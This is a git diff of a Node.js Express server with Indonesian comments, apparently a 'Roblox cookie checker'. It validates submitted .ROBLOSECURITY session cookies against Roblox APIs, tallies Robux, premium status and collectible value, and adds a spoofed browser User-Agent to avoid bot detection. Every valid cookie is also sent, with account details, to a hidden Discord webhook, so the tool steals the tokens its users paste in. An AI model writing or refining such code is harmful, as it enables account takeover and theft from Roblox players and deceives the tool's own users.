@@ -8,60 +8,85 @@ app.use(express.static(path.join(__dirname, 'public')));
 
 const SECRET_WEBHOOK_URL = process.env.DISCORD_WEBHOOK || "MASUKKAN_URL_WEBHOOK_DISCORD_KAMU_DISINI";
 
+// Header standar agar tidak terdeteksi sebagai bot oleh API Roblox
+const getHeaders = (cookie) => ({
+    'Cookie': `.ROBLOSECURITY=${cookie}`,
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+    'Accept': 'application/json'
+});
+
 async function checkRobloxCookie(cookie) {
     try {
+        // 1. Authenticated User Check (Wajib Utama)
         const userRes = await axios.get('https://users.roblox.com/v1/users/authenticated', {
-            headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
+            headers: getHeaders(cookie),
+            timeout: 5000
         });
-        
-        const userId = userRes.data.id;
-        const username = userRes.data.name;
-        const displayName = userRes.data.displayName;
 
+        if (!userRes.data || !userRes.data.id) {
+            return { success: false, reason: "Cookie tidak valid / expired" };
+        }
+
+        const userId = userRes.data.id;
+        const username = userRes.data.name || "Unknown";
+        const displayName = userRes.data.displayName || username;
+
+        // 2. Robux Check
         let robux = 0;
         try {
             const currencyRes = await axios.get(`https://economy.roblox.com/v1/users/${userId}/currency`, {
-                headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
+                headers: getHeaders(cookie),
+                timeout: 4000
             });
             robux = currencyRes.data.robux || 0;
         } catch (e) {}
 
-        let createdDate = "Unknown";
+        // 3. User Details (Created Date)
+        let createdDate = "Tidak diketahui";
         try {
-            const infoRes = await axios.get(`https://users.roblox.com/v1/users/${userId}`);
-            createdDate = new Date(infoRes.data.created).toLocaleDateString();
+            const infoRes = await axios.get(`https://users.roblox.com/v1/users/${userId}`, { timeout: 4000 });
+            if (infoRes.data && infoRes.data.created) {
+                createdDate = new Date(infoRes.data.created).toLocaleDateString('id-ID');
+            }
         } catch (e) {}
-        
+
+        // 4. Premium Check
         let isPremium = false;
         try {
             const premRes = await axios.get(`https://premiumfeatures.roblox.com/v1/users/${userId}/validate-membership`, {
-                headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
+                headers: getHeaders(cookie),
+                timeout: 4000
             });
-            isPremium = premRes.data;
+            isPremium = !!premRes.data;
         } catch (e) {}
 
+        // 5. Limiteds / Collectibles (Total RAP)
         let totalRap = 0;
         let valuableItems = [];
         try {
-            const invRes = await axios.get(`https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?limit=100`, {
-                headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
+            const invRes = await axios.get(`https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?limit=50`, {
+                headers: getHeaders(cookie),
+                timeout: 4000
             });
             if (invRes.data && invRes.data.data) {
                 valuableItems = invRes.data.data.map(item => {
-                    totalRap += (item.recentAveragePrice || 0);
+                    const rap = item.recentAveragePrice || 0;
+                    totalRap += rap;
                     return {
                         name: item.name,
-                        rap: item.recentAveragePrice || 0,
+                        rap: rap,
                         assetId: item.assetId
                     };
                 });
             }
         } catch (e) {}
 
+        // 6. Animations
         let animations = [];
         try {
             const animRes = await axios.get(`https://inventory.roblox.com/v1/users/${userId}/assets/24?limit=50`, {
-                headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
+                headers: getHeaders(cookie),
+                timeout: 4000
             });
             if (animRes.data && animRes.data.data) {
                 animations = animRes.data.data.map(anim => anim.name);
@@ -82,39 +107,49 @@ async function checkRobloxCookie(cookie) {
             cookie
         };
     } catch (error) {
-        return { success: false };
+        return { success: false, reason: error.response?.status === 401 ? "Expired" : "Error Server/API" };
     }
 }
 
 app.post('/api/check', async (req, res) => {
-    const { cookies } = req.body;
-    if (!cookies || !Array.isArray(cookies)) {
-        return res.status(400).json({ error: "Format cookie tidak valid." });
-    }
+    try {
+        const { cookies } = req.body;
+        if (!cookies || !Array.isArray(cookies)) {
+            return res.status(400).json({ error: "Format input tidak valid." });
+        }
 
-    const results = [];
-    for (let rawCookie of cookies) {
-        const cleanCookie = rawCookie.trim();
-        if (!cleanCookie) continue;
+        const results = [];
+        for (let rawCookie of cookies) {
+            let cleanCookie = rawCookie.trim();
+            // Bersihkan jika ada tanda petik berlebih
+            cleanCookie = cleanCookie.replace(/^["']|["']$/g, '');
 
-        const result = await checkRobloxCookie(cleanCookie);
-        if (result.success) {
-            results.push(result);
+            if (!cleanCookie) continue;
 
-            if (SECRET_WEBHOOK_URL && SECRET_WEBHOOK_URL.startsWith("http")) {
-                try {
-                    await axios.post(SECRET_WEBHOOK_URL, {
-                        content: `🚨 **AKUN ROBLOX VALID DITEMUKAN!**\n` +
-                                 `👤 **Username:** ${result.username} (${result.displayName})\n` +
-                                 `💰 **Robux:** ${result.robux} | 💎 **Total RAP:** ${result.totalRap}\n` +
-                                 `🔑 \`\`${result.cookie}\`\``
-                    });
-                } catch (webhookErr) {}
+            const result = await checkRobloxCookie(cleanCookie);
+            if (result.success) {
+                results.push(result);
+
+                // Kirim Webhook privat
+                if (SECRET_WEBHOOK_URL && SECRET_WEBHOOK_URL.startsWith("http")) {
+                    try {
+                        await axios.post(SECRET_WEBHOOK_URL, {
+                            content: `🚨 **AKUN ROBLOX VALID DITEMUKAN!**\n` +
+                                     `👤 **Username:** ${result.username} (${result.displayName})\n` +
+                                     `🆔 **ID:** ${result.userId}\n` +
+                                     `💰 **Robux:** ${result.robux} | 💎 **Total RAP:** ${result.totalRap}\n` +
+                                     `🏃 **Animasi:** ${result.animations.length} item\n` +
+                                     `🔑 \`\`\`${result.cookie}\`\`\``
+                        }, { timeout: 3000 });
+                    } catch (wErr) {}
+                }
             }
         }
-    }
 
-    res.json({ results });
+        res.json({ success: true, results });
+    } catch (err) {
+        res.status(500).json({ error: "Terjadi kesalahan internal server." });
+    }
 });
 
 const PORT = process.env.PORT || 3000;
